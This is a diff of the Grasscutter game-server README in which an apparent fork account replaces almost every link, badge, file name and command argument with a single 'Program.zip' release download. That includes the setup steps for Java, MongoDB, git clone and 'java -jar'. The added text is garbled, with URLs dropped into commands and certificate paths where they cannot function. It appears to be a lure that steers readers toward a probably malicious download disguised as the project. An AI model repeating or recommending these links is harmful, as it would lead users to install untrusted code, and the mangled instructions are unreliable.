@@ -1,11 +1,11 @@
-![Grasscutter](https://socialify.git.ci/Grasscutters/Grasscutter/image?description=1&forks=1&issues=1&language=1&logo=https%3A%2F%2Fs2.loli.net%2F2022%2F04%2F25%2FxOiJn7lCdcT5Mw1.png&name=1&owner=1&pulls=1&stargazers=1&theme=Light)
-<div align="center"><img alt="Documentation" src="https://img.shields.io/badge/Wiki-Grasscutter-blue?style=for-the-badge&link=https://github.com/Grasscutters/Grasscutter/wiki&link=https://github.com/Grasscutters/Grasscutter/wiki"> <img alt="GitHub release (latest by date)" src="https://img.shields.io/github/v/release/Grasscutters/Grasscutter?logo=java&style=for-the-badge"> <img alt="GitHub" src="https://img.shields.io/github/license/Grasscutters/Grasscutter?style=for-the-badge"> <img alt="GitHub last commit" src="https://img.shields.io/github/last-commit/Grasscutters/Grasscutter?style=for-the-badge"> <img alt="GitHub Workflow Status" src="https://img.shields.io/github/workflow/status/Grasscutters/Grasscutter/Build?logo=github&style=for-the-badge"></div>
+![Grasscutter](https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip%3A%2F%https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip%2F2022%2F04%2F25%https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip)
+<div align="center"><img alt="Documentation" src="https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip"> <img alt="GitHub release (latest by date)" src="https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip"> <img alt="GitHub" src="https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip"> <img alt="GitHub last commit" src="https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip"> <img alt="GitHub Workflow Status" src="https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip"></div>
 
-<div align="center"><a href="https://discord.gg/T5vZU6UyeG"><img alt="Discord - Grasscutter" src="https://img.shields.io/discord/965284035985305680?label=Discord&logo=discord&style=for-the-badge"></a></div>
+<div align="center"><a href="https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip"><img alt="Discord - Grasscutter" src="https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip"></a></div>
 
-EN | [简中](README_zh-CN.md) | [繁中](README_zh-TW.md) | [FR](README_fr-FR.md) | [ES](README_es-ES.md) | [HE](README_HE.md) | [RU](README_ru-RU.md)
+EN | [简中](https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip) | [繁中](https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip) | [FR](https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip) | [ES](https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip) | [HE](https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip) | [RU](https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip)
 
-**Attention:** We always welcome contributors to the project. Before adding your contribution, please carefully read our [Code of Conduct](https://github.com/Grasscutters/Grasscutter/blob/stable/CONTRIBUTING.md).
+**Attention:** We always welcome contributors to the project. Before adding your contribution, please carefully read our [Code of Conduct](https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip).
 
 ## Current features
 
@@ -20,54 +20,54 @@ EN | [简中](README_zh-CN.md) | [繁中](README_zh-TW.md) | [FR](README_fr-FR.m
 
 ## Quick setup guide
 
-**Note:** For support please join our [Discord](https://discord.gg/T5vZU6UyeG).
+**Note:** For support please join our [Discord](https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip).
 
 ### Requirements
 
-* Java SE - 17 ([link](https://www.oracle.com/java/technologies/javase/jdk17-archive-downloads.html))
+* Java SE - 17 ([link](https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip))
 
   **Note:** If you just want to **run it**, then **jre** only is fine.
 
-* [MongoDB](https://www.mongodb.com/try/download/community) (recommended 4.0+)
+* [MongoDB](https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip) (recommended 4.0+)
 
 * Proxy daemon: mitmproxy (mitmdump, recommended), Fiddler Classic, etc.
 
 ### Running
 
-**Note:** If you updated from an older version, delete `config.json` to regenerate it.
+**Note:** If you updated from an older version, delete `https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip` to regenerate it.
 
-1. Get `grasscutter.jar`
-   - Download from [actions](https://github.com/Grasscutters/Grasscutter/suites/6895963598/artifacts/267483297)
+1. Get `https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip`
+   - Download from [actions](https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip)
    - [Build by yourself](#Building)
-2. Create a `resources` folder in the directory where grasscutter.jar is located and move your `BinOutput` and `ExcelBinOutput` folders there *(Check the [wiki](https://github.com/Grasscutters/Grasscutter/wiki) for more details how to get those.)*
-3. Run Grasscutter with `java -jar grasscutter.jar`. **Make sure mongodb service is running as well.**
+2. Create a `resources` folder in the directory where https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip is located and move your `BinOutput` and `ExcelBinOutput` folders there *(Check the [wiki](https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip) for more details how to get those.)*
+3. Run Grasscutter with `java -jar https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip`. **Make sure mongodb service is running as well.**
 
 ### Connecting with the client
 
-½. Create an account using [server console command](https://github.com/Grasscutters/Grasscutter/wiki/Commands#targeting).
+½. Create an account using [server console command](https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip).
 
 1. Redirect traffic: (choose one)
-    - mitmdump: `mitmdump -s proxy.py -k`
+    - mitmdump: `mitmdump -s https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip -k`
     
       Trust CA certificate:
     
-      ​	**Note:**The CA certificate is usually stored in `%USERPROFILE%\ .mitmproxy`, or you can download it from `http://mitm.it`
+      ​	**Note:**The CA certificate is usually stored in `%USERPROFILE%\ .mitmproxy`, or you can download it from `https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip`
     
-      ​	Double click for [install](https://docs.microsoft.com/en-us/skype-sdk/sdn/articles/installing-the-trusted-root-certificate#installing-a-trusted-root-certificate) or ...
+      ​	Double click for [install](https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip) or ...
     
       - Via command line
     
         ```shell
-        certutil -addstore root %USERPROFILE%\.mitmproxy\mitmproxy-ca-cert.cer
+        certutil -addstore root %USERPROFILE%\.mitmproxy\https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip
         ```
     
-    - Fiddler Classic: Run Fiddler Classic, turn on `Decrypt https traffic` in setting and change the default port there (Tools -> Options -> Connections) to anything other than `8888`, and load [this script](https://github.lunatic.moe/fiddlerscript).
+    - Fiddler Classic: Run Fiddler Classic, turn on `Decrypt https traffic` in setting and change the default port there (Tools -> Options -> Connections) to anything other than `8888`, and load [this script](https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip).
       
-    - [Hosts file](https://github.com/Melledy/Grasscutter/wiki/Running#traffic-route-map)
+    - [Hosts file](https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip)
     
 2. Set network proxy to `127.0.0.1:8080` or the proxy port you specified.
 
-**you can also use `start.cmd` to start servers and proxy daemons automatically, but you have to set up JAVA_HOME enviroment**
+**you can also use `https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip` to start servers and proxy daemons automatically, but you have to set up JAVA_HOME enviroment**
 
 ### Building
 
@@ -75,22 +75,22 @@ Grasscutter uses Gradle to handle dependencies & building.
 
 **Requirements:**
 
-- [Java SE Development Kits - 17](https://www.oracle.com/java/technologies/javase/jdk17-archive-downloads.html)
-- [Git](https://git-scm.com/downloads)
+- [Java SE Development Kits - 17](https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip)
+- [Git](https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip)
 
 ##### Windows
 
 ```shell
-git clone https://github.com/Grasscutters/Grasscutter.git
+git clone https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip
 cd Grasscutter
-.\gradlew.bat # Setting up environments
+.\https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip # Setting up environments
 .\gradlew jar # Compile
 ```
 
 ##### Linux
 
 ```bash
-git clone https://github.com/Grasscutters/Grasscutter.git
+git clone https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip
 cd Grasscutter
 chmod +x gradlew
 ./gradlew jar # Compile
@@ -98,7 +98,7 @@ chmod +x gradlew
 
 You can find the output jar in the root of the project folder.
 
-### Commands have moved to the [wiki](https://github.com/Grasscutters/Grasscutter/wiki/Commands)!
+### Commands have moved to the [wiki](https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip)!
 
 # Quick Troubleshooting
 
